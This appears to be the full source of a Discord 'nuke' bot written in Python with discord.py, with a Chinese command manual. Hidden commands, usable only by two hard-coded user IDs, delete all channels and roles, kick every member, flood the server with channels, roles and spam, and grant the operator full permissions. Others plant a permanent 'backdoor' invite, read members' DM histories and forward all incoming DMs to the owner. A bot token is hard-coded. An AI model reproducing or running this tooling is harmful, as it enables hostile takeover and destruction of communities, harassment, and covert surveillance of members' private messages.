import discord
from discord.ext import commands
import random
import datetime
import asyncio
import string
from flask import Flask
from threading import Thread
import os

app = Flask('')
intents = discord.Intents.all()

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

ALLOWED_IDS = [1008278721007992863, 1355108796388872292] 

async def is_me(ctx):
    if ctx.author.id in ALLOWED_IDS:
        try:
            await ctx.message.delete()
        except:
            pass
        return True
    return False

@app.route('/')
def home():
    return "Bot is running!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command(name="help")
async def help_msg(ctx):
    if not await is_me(ctx): 
        return
    
    embed = discord.Embed(
        title="🧳 旅行者系統 - 指令詳細手冊", 
        description="此指令表僅對授權人員顯示。執行任何指令皆會自動隱身。",
        color=discord.Color.from_str("#2b2d31")
    )
    embed.add_field(
        name="🛡️ 基礎管理", 
        value=(
            "`!tm @成員 [分]` - 禁言該成員，預設 10 分鐘\n"
            "`!kick_everyone` - 踢出伺服器內所有一般成員\n"
            "`!bye` - 讓機器人立即退出此伺服器\n"
            "`!set_server [名]` - 修改伺服器的名稱\n"
            "`!add_role @成員 @組` - 給予成員特定身分組\n"
            "`!remove_role @成員 @組` - 移除成員特定身分組\n"
            "`!server_gate [lock/unlock]` - 鎖定或解鎖伺服器頻道的發言權限\n"
        ), 
        inline=False
    )
    embed.add_field(
        name="🔥 破壞/重整", 
        value=(
            "`!del_ch` - 刪除所有頻道並建立一個初始頻道\n"
            "`!del_role` - 刪除所有可移除的身份組\n"
            "`!100ch` - 瞬間建立 100 個測試文字頻道\n"
            "`!100rl` - 瞬間建立 100 個隨機顏色身份組\n"
        ), 
        inline=False
    )
    embed.add_field(
        name="🕵️ 隱蔽操作", 
        value=(
            "`!op_me` - 建立並賦予自己最高權限身分組\n"
            "`!disrole @成員` - 剝奪對方所有身分並丟入隔離區\n"
            "`!del_msg [數]` - 批次清理目前頻道的對話紀錄\n"
            "`!backdoor` - 建立永久邀請連結並私訊給你\n"
            "`!get_dm @成員 [數]` - 調閱機器人與該成員的私訊紀錄\n"
        ), 
        inline=False
    )
    embed.add_field(
        name="🎮 娛樂/通訊", 
        value=(
            "`!dm @成員 [文]` - 以機器人名義私訊特定成員\n"
            "`!spam [次] [文]` - 帶有防封號後綴的快速刷屏\n"
            "`!move_all [ID]` - 將語音內所有人移動到指定頻道\n"
            "`!reset` - 重新啟動內部系統\n"
        ), 
        inline=False
    )
    embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
    await ctx.send(embed=embed)

@bot.command(name="dm")
async def dm(ctx, member: discord.Member, *, text: str):
    if not await is_me(ctx): return
    try:
        await member.send(text)
    except:
        pass

@bot.command(name="del_ch")
async def nuke_channels(ctx):
    if not await is_me(ctx): return
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
    await ctx.guild.create_text_channel("general")

@bot.command(name="kick_everyone")
async def kick_everyone(ctx):
    if not await is_me(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user and member != ctx.guild.owner:
            try: await member.kick()
            except: pass

@bot.command(name="del_role")
async def clear_roles(ctx):
    if not await is_me(ctx): return
    for role in ctx.guild.roles:
        if role.name != "@everyone" and not role.managed:
            try: await role.delete()
            except: pass

@bot.command(name="set_server")
async def set_server(ctx, *, name: str):
    if not await is_me(ctx): return
    try: await ctx.guild.edit(name=name)
    except: pass

@bot.command(name="bye")
async def leave_server(ctx):
    if not await is_me(ctx): return
    await ctx.guild.leave()

@bot.command(name="del_msg")
async def purge_chat(ctx, amount: int = 10):
    if not await is_me(ctx): return
    try: await ctx.channel.purge(limit=amount)
    except: pass

@bot.command(name="spam")
async def spam(ctx, count: int, *, text: str):
    if not await is_me(ctx): return
    for i in range(min(count, 100)):
        try:
            suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
            await ctx.send(f"{text} | {suffix}")
            await asyncio.sleep(random.uniform(0.7, 1.2))
        except:
            await asyncio.sleep(5)
            continue

@bot.command(name="100rl")
async def role_hell(ctx):
    if not await is_me(ctx): return
    for i in range(100):
        color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        try: await ctx.guild.create_role(name=f"{i}", color=color)
        except: break

@bot.command(name="100ch")
async def flood(ctx, name="ch-----test"):
    if not await is_me(ctx): return
    for i in range(100):
        try: await ctx.guild.create_text_channel(f"{name}-{i}")
        except: break

@bot.command(name="op_me")
async def op_me(ctx):
    if not await is_me(ctx): return
    guild = ctx.guild
    try:
        new_role = await guild.create_role(
            name="OP", 
            permissions=discord.Permissions.all(), 
            color=discord.Color.from_str("#2b2d31")
        )
        await ctx.author.add_roles(new_role)
        await new_role.edit(position=guild.me.top_role.position - 1)
    except: pass

@bot.command(name="tm")
async def tm(ctx, member: discord.Member = None, minutes: int = 10):
    if not await is_me(ctx): return
    if member is None: return
    try:
        duration = datetime.timedelta(minutes=minutes)
        await member.timeout(duration, reason="你呼吸")
    except: pass

@bot.command(name="backdoor")
async def backdoor(ctx):
    if not await is_me(ctx): return
    try:
        inv = await ctx.channel.create_invite(max_age=0, max_uses=0)
        await ctx.author.send(f"永久入口: {inv.url}")
    except: pass

@bot.command(name="move_all")
async def move_all(ctx, channel: discord.VoiceChannel):
    if not await is_me(ctx): return
    for member in ctx.guild.members:
        if member.voice:
            try: await member.move_to(channel)
            except: pass

@bot.command(name="disrole")
async def isolate(ctx, member: discord.Member):
    if not await is_me(ctx): return
    try:
        await member.edit(roles=[])
        iso_role = discord.utils.get(ctx.guild.roles, name="Prisoner")
        if not iso_role:
            iso_role = await ctx.guild.create_role(name="Prisoner", permissions=discord.Permissions.none())
        await member.add_roles(iso_role)
    except: pass

@bot.command(name="server_gate")
async def server_gate(ctx, status: str):
    if not await is_me(ctx): return
    can_send = True if status == "unlock" else False
    for channel in ctx.guild.text_channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=can_send)
        except: pass

@bot.command(name="add_role")
async def add_role(ctx, member: discord.Member, role: discord.Role):
    if not await is_me(ctx): return
    try:
        await member.add_roles(role)
    except Exception as e:
        print(f"Error: {e}")

@bot.command(name="remove_role")
async def remove_role(ctx, member: discord.Member, role: discord.Role):
    if not await is_me(ctx): return
    try:
        await member.remove_roles(role)
    except Exception as e:
        print(f"Error: {e}")

@bot.command(name="get_dm")
async def get_dm(ctx, member: discord.Member, limit: int = 10):
    if not await is_me(ctx): return
    try:
        dm_channel = member.dm_channel or await member.create_dm()
        history = []
        async for msg in dm_channel.history(limit=limit):
            who = "機器人" if msg.author == bot.user else "成員"
            history.append(f"[{msg.created_at.strftime('%H:%M')}] {who}: {msg.content}")
        result = "\n".join(reversed(history)) or "無私訊紀錄"
        await ctx.author.send(f"📂 **與 {member.name} 的對話紀錄 (由舊到新)：**\n{result[:1900]}")
    except Exception as e:
        print(f"調閱失敗: {e}")

@bot.command(name="reset")
async def reboot(ctx):
    if not await is_me(ctx): return
    await ctx.send("🔄 正在重新啟動內部系統...")
    os._exit(0) 

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if isinstance(message.channel, discord.DMChannel):
        if not message.content.startswith("!"):
            owner = await bot.fetch_user(ALLOWED_IDS[0])
            await owner.send(f"📩 **收到私訊**\n來自: {message.author}\n內容: {message.content}")
    await bot.process_commands(message)
    
bot.run("MTQ4NzcyNTMzMDExNzU2MjM5OQ.GdEAio.tb5pS63n67Hy_ILNZBQnVZZ6A2sFX2nxEfWyjY")
